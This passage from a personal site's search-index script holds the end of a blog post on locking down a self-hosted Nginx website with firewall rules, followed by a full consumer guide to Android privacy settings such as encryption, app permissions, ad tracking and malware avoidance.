addresses (which they so generously provide) and adjust my NAT port forwarding rules for TCP port 80 and 443 to specify that only those source IPs can connect to my WAN address. And just like that, now if I try to go to my public IP address from my phone on mobile data, my router drops the connection as opposed to trusting Nginx to.Without this configuration, in theory, if someone suspected both my public IP address and a domain I’m hosting, they could configure their hosts file to point my domain directly to my IP address. Nginx wouldn’t know any different and would serve the website, thus revealing to the adversary that that is, in fact, my IP. This may be a bit of a stretch; the real practical reason for doing this is that I want to end a connection that I want nothing to do with as far away from my actual devices as possible, and it doesn’t get much further than my public-facing firewall.It could be argued that this makes the Nginx setup moot, but hey, isn’t that a sign of good defense in depth?ConclusionAt the end of the day, the most secure way to host for my home network will be to rent a cheap Vultr or Linode VPS. However, when I have the hardware, the patience for sysadmin-ing, and plenty of quarantine time to put it all together, it’s worth it to me to save a few bucks and self-host with plenty of security precautions.",
        "url": "/misc/securewebsite/"
      }
      ,
    
      "misc-androidprivacy": {
        "title": "How To Protect Your Privacy On Android",
        "author": "",
        "category": "",
        "content": "How To Protect Your Privacy On AndroidI was recently shown an interesting blog post by the DuckDuckGo team showing how an iPhone user could go about protecting their privacy making various changes to the phone. In an effort to help Android users become more aware of how they can protect their privacy as well, I thought I would compare privacy options for iOS and Android, as well as show some other ways Android users can protect their privacy. The first 11 steps will directly contrast the steps shown in the DuckDuckGo article.1. Use a custom passcode longer than 4 digits.If you haven’t yet set up a password on your Android device, it’s always a good time to do so. In addition to protecting your information from being accessed from the device itself, applications that request sensitive permissions from the device will the device to prompt you for the password to be entered as well to ensure that it’s actually you giving the app permission to your info.Instructions: Settings &gt; Security &gt; Screen lock (location may vary depending on Android version/manufacturer) &gt; PasswordNote that this password is independent of your Google password. You are presented with other options as well, such as a pattern or PIN. Passwords are the most secure option; patterns and PINs can often be cracked within hours, if not minutes.2. Enable “Erase Data” to delete data after 10 failed passcode attempts. (Bonus: encrypt all of your storage, including the SD card)A major issue with wiping data is that doing so requires it to be overwritten, not simply “deleted”. This can take hours, if not days, to do thoroughly on devices with flash memory (like smartphones). If an Android device were to attempt to wipe itself like this after being bruteforced, the attacker would have an opportunity to try to retrieve the information again.The solution implemented by the Android developers is to allow the user to encrypt the data on both the internal and external SD card (since Android devices have those), that way if the password is entered too many incorrect times, the significantly smaller encryption key is wiped instead, rendering the encrypted information useless.Instructions:  If you’re on Android 7.0 or later, your device already does this by default, as long as you have a screen lock enabled, as described in the prior step. Congratulations! You can read more about it here.  If you’re on Android 6.0.1 or earlier, you’ll first want to enable a screen lock, which can be done with the prior step.  Next, you’ll want to head to Settings &gt; Security, and select the option to encrypt your device. It should say something along the lines of “Encrypt phone” and/or “Encrypt SD card storage”. You can choose which you want to do. Be careful though: if you encrypt your SD card and reset your phone, sell it, trade it in, etc., your SD card will be inaccessible because the data are still encrypted with the old encryption key!Note: you can see what version of Android you have by following this quick guide. It was written for the Google Pixel, but should work for most Android devices.3. Don’t show notifications in the lock screen for sensitive apps.Before Android 5.0, no notifications were shown on the lock screen whatsoever. After 5.0, though, users were given the choice of seeing notifications on the lock screen in their entirety, seeing the application but hiding the contents, or not showing anything, as was the case in previous versions of Android.Instructions:  As with Step 2, you’ll first want to enable a screen lock on your device.  After that, go to Settings &gt; Sound &amp; Notification. At this point, you’ll be able to choose between “Show all notification content,” “Hide sensitive notification content,” and “Don’t show notifications at all”.  If you choose the second option, you also get to choose which of your apps are considered sensitive! All are by default, but if there’s an app whose information you do want visible on the lock screen, you can go to Settings &gt; Apps &gt; [An app of your choosing] &gt; Notifications, and you can choose your desired settings.4. Turn off “Share My Location.”This is a feature exclusive to iOS devices. Android does not inherently share your location with family and friends. Some apps that you may have installed, such as Google+, may do so, but that can be easily disabled if you…5. Turn off location services for things that don’t need them.In the Android 4.0 beta, a hidden feature known as “AppOps” was present, which allowed users to disable certain permissions of a particular app. For reasons unknown, this was removed in the release version of 4.0, but it has been implemented as an app by third-party developers. One such example can be found here. If you have Android 4.3-5.1, this app will allow you to disable location services on an app-by-app basis.Instructions:  If you have a version of Android including or after 4.3 and before 5.1, use AppOps on the Google Play Store to disable location settings for individual apps  If you have Android 6.0 or later, you can do this without a third-party app, as the functionality was returned as an official feature with the release of 6.0. Though the specifics may vary from device to device, the general idea is to go to Settings &gt; Apps &gt; Permissions &gt; [An app of your choosing] &gt; Permissions &gt; Whatever permissions you want to disable – “Location” in this particular caseNote: If you want a list of apps that have requested your location in the past as a reference, you can go to Settings &gt; Location, where you should see a list of apps that have made these requests.6. Turn off access to sensitive data for apps that don’t need it.The instructions from step 5 can be used to restrict access to private information if you have an Android device on version 4.3 or later.7. Review your installed apps.It never hurts to go through your installed apps once in a while and uninstall the ones you don’t use. There’s a chance the app may be draining your battery in the background, or could be a potential vulnerability if it’s not by an established developer (or sometimes, even if it is)Instructions:  Settings &gt; Apps &gt; [An app of your choosing] &gt; Uninstall8. Turn off read receipts so people are not notified when you see their messages.Android has supported disabling read receipts for as long as they’ve been a part of Android (which hasn’t been too long to begin with).Instructions:Though the particular steps once again vary depending on your version of Android and the manufacturer of your device, this is the general idea of where you want to go:  Messaging app &gt; Menu (may be shown as three dots) &gt; Settings &gt; Messages/Text Messages/Multimedia Messages (may be under “advanced”, “more”, etc.) &gt; Allow read reports/Allow delivery reports9. Turn on “Limit ad tracking”.Android advertising is done through Google Ads, and can be limited through the Google appInstructions:Settings &gt; Google services &gt; Ads &gt; Opt out of Ads Personalization10. From time-to-time, reset your advertising identifier.As with the previous step, this can be done with with the Google app, under the same menu.InstructionsSettings &gt; Google services &gt; Ads &gt; Reset advertising ID &gt; Confirm11. Set DuckDuckGo as your default search engine.Given that this was a post originally on the DuckDuckGo blog, one could expect a plug for using DuckDuckGo as your search engine. The steps vary depending on your browser, but specific instructions can be found on the DuckDuckGo Android Support Page.Bonus: Set up Android Device ManagerAndroid Device Manager is an entirely free service by Google that allows you to remotely lock, ring, or wipe your device. The steps to ensure that it’s working properly can be found on Google’s official Android Device Manager support page.Bonus: Block ads and trackersIf you have Firefox installed on your Android device (my personal Android web browser recommendation as a result of being publicly licensed and open-source), you can install the uBlock Origin add-on for Firefox for Android. Navigate to that page on your device and press “Add to Firefox”. uBlock Origin will automatically begin blocking ads and trackers that appear in your visited sites.Bonus: Avoid MalwareOne of Android’s greatest strengths are also one of its greatest weaknesses… as far as security goes, anyway. Android is more open than iOS in many ways, one of which being that users are able to install their own applications, whereas all iOS applications must be installed through the app store.When installing an app, regardless of where it originates (but especially if it’s not through the Play Store), be sure that you trust the source of the app. Google doesn’t have any control over apps outside of the app store, so it doesn’t pass Google’s anti-malware guidelines before it makes it to your device. Fortunately, on Android, malware is rare outside of rogue apps, so as long as you’re installing trusted apps, you should be fine.",
        "url": "/misc/androidprivacy/"
      }
      
    
  };
</script>
<script src="/assets/js/lunr.min.js"></script>
<script src="/assets/js/search.js"></script>


    </main><footer>
  <a href="https://twitter.com/ratilovich">Twitter</a> 
</footer>
</div>
  </body>
</html>
